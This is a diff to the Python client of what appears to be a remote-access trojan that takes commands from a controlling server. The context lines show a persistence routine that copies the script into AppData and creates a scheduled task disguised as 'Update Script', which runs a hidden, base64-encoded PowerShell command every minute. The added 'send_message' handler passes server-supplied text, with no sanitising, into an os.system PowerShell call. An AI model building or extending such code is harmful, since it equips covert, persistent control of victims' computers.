@@ -102,6 +102,8 @@ def start_client():  # Start the client side and all the communication is here.
                 screenshot(client)
             elif command == "persistence":
                 persistence()
+            elif command == "send_message":
+                send_message(client)
             elif command == "alive?":
                 client.sendall("yes".encode())
             else:
@@ -120,6 +122,16 @@ def persistence():
         os.system(fr'copy "{cwd}\client.py" "C:\Users\{username}\AppData\Roaming"')
         os.system(fr'schtasks /create /sc minute /mo 1 /tn "Update Script" /tr "powershell.exe -nop -w hidden -e SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAcAB5AHQAaABvAG4AIABDADoAXABVAHMAZQByAHMAXABEAGEAbgBpAGUAbABcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAYwBsAGkAZQBuAHQALgBwAHkAIAB9AA=="')
         client.sendall("Persistence added successfully.".encode())
+    except Exception as e:
+        print(f"{e}")
+
+def send_message(client):
+    """this function show the client a message"""
+    try:
+        msg = client.recv(BUFFER_SIZE).decode()
+        msg = msg[:0] + "'" + msg[0:] + "'"
+        os.system(fr'PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show({msg})"')
+        client.sendall("Message sent successfully.".encode())
     except Exception as e:
         print(f"{e}")
 
